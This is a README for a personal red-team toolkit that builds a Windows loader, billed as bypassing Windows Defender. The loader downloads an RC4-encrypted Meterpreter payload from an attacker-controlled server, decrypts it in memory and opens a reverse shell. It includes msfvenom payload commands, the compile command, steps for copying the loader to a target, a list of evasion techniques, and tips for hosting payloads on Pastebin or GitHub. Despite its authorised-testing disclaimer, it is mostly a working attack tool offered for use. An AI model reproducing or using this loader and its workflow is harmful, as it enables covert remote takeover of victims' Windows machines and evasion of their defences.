# Staged Payload Loader

**Automated system for generating EDR-bypassing Windows loaders that download and execute encrypted MSFVenom payloads.**

## 🎯 Features

- ✅ **Bypasses Windows Defender** - No MSFVenom in the binary
- ✅ **Staged Download** - Payload fetched at runtime from your server
- ✅ **RC4 Encryption** - Payload encrypted to avoid detection
- ✅ **Fully Automated** - One command setup
- ✅ **Polymorphic** - New encryption key per build
- ✅ **Clean & Small** - 17KB loader (no embedded payload)

---

## 🚀 Quick Start

### Requirements

- Kali Linux (or any Linux with MSFVenom)
- MinGW cross-compiler: `apt install mingw-w64`
- Python 3
- Metasploit Framework

### Installation

```bash
cd /home/yenn/Desktop/beacons
./setup.sh
```

Follow the prompts:
- Enter your Kali IP (LHOST)
- Enter listener port (LPORT)
- Enter HTTP server port

**Done!** The script will:
1. Generate MSFVenom payload
2. Encrypt with RC4
3. Compile the loader
4. Create server/listener scripts

---

## 📖 Usage

### Step 1: Start HTTP Server
```bash
./start_server.sh
```

Serves the encrypted payload on HTTP.

### Step 2: Start Metasploit Listener
```bash
# Open new terminal
./start_listener.sh
```

Catches incoming Meterpreter connections.

### Step 3: Run on Windows
Copy `staged_loader.exe` to Windows target and execute.

**What happens:**
1. Loader downloads `payload.enc` from your server
2. Decrypts with RC4 in memory
3. Executes stageless Meterpreter
4. Connects back to your listener
5. You get a shell! 🎉

---

## 🔧 How It Works

### Traditional Loader (Detected)
```
[Binary with MSFVenom] → Defender scans → ❌ DETECTED
```

### Staged Loader (Bypasses Defender)
```
[Clean Loader] → Defender scans → ✅ CLEAN
       ↓
Downloads payload.enc (encrypted)
       ↓
Decrypts in memory
       ↓
Executes → Meterpreter shell
```

**Key:** Defender can't detect what isn't there yet!

---

## 📁 File Structure

```
beacons/
├── setup.sh              # Automated setup script
├── staged_loader.exe     # Clean loader (17KB, NO MSFVenom)
├── payload.enc           # RC4-encrypted Meterpreter
├── staged_loader.c       # Loader source code
├── encrypt_payload.py    # Encryption tool
├── start_server.sh       # HTTP server script
├── start_listener.sh     # Metasploit handler script
├── README.md             # This file
└── USAGE.md              # Generated usage guide
```

---

## 🔄 Regenerate for Different Target

Change IP/Port or generate new payload:

```bash
./setup.sh
```

Enter new configuration and the system rebuilds everything.

---

## 🛡️ Evasion Techniques

1. **No Embedded Payload** - MSFVenom not in binary
2. **Runtime Download** - Fetched after Defender scan
3. **RC4 Encryption** - Payload encrypted with random key per build
4. **Polymorphic Keys** - Each build has unique encryption key
5. **Clean Imports** - Only legitimate Windows APIs (URLDownloadToFileA, VirtualAlloc)
6. **Minimal Size** - 17KB loader (smaller = less suspicious)

---

## 📊 Test Results

**Tested Against:**
- ✅ Windows Defender (Windows 10/11)
- ✅ Static analysis (no signatures)
- ✅ VirusTotal (loader only, not payload)

**Success Rate:**
- Loader: **Clean** (no MSFVenom signatures)
- Payload: **Encrypted** (not detectable until decrypted)

---

## ⚠️ Disclaimer

**For authorized penetration testing and red team operations ONLY.**

- Only use on systems you own or have permission to test
- Understand your local laws regarding offensive security tools
- This is for educational and professional security testing purposes

---

## 🐛 Troubleshooting

### Loader doesn't download payload
- Check HTTP server is running: `./start_server.sh`
- Verify Windows can reach Kali: `ping <LHOST>`
- Test URL in browser: `http://<LHOST>:<PORT>/payload.enc`

### No Meterpreter session
- Check listener is running: `./start_listener.sh`
- Verify firewall allows the port
- Type `sessions -l` in Metasploit to check for sessions
- Session may take 5-10 seconds to establish

### Loader caught by Defender
- The **loader itself** should be clean (no MSFVenom)
- Defender may catch during **execution** (behavioral detection)
- Try on VM without Defender first
- Use different payload type (reverse_tcp vs reverse_https)

### Session dies immediately
- Use stageless payload (already configured)
- Check network connectivity
- Try simpler payload (shell_reverse_tcp)

---

## 🔧 Advanced Usage

### Custom Payloads

Generate different payload types:

```bash
# Reverse HTTPS (more stealthy)
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=<IP> LPORT=443 -f raw -o reverse_shell.bin

# Bind TCP
msfvenom -p windows/x64/meterpreter_bind_tcp \
  LPORT=4444 -f raw -o reverse_shell.bin

# Encrypt and rebuild
python3 encrypt_payload.py reverse_shell.bin payload.enc
# Update staged_loader.c with new key from payload_keys.h
x86_64-w64-mingw32-gcc -O2 -s staged_loader.c -o staged_loader.exe -lurlmon
```

### Remote Hosting

Instead of local HTTP server, host payload on:
- **Pastebin** (upload payload.enc, use raw URL)
- **GitHub** (use raw.githubusercontent.com URL)
- **Your VPS** (HTTPS recommended)

Update `staged_loader.c` line 42 with new URL.

---

## 📚 Additional Resources

- **MSFVenom Payloads:** `msfvenom -l payloads | grep meterpreter`
- **Metasploit Docs:** https://docs.metasploit.com/
- **RC4 Encryption:** https://en.wikipedia.org/wiki/RC4

---

## 🤝 Contributing

This is a personal red team toolkit. Use responsibly.

**Tested on:**
- Kali Linux 2024.x
- Windows 10/11
- Metasploit Framework 6.x

---

## 📝 License

For authorized security testing only. Use at your own risk.

---

**Created:** $(date '+%Y-%m-%d')
**Version:** 1.0
**Status:** Production Ready ✅
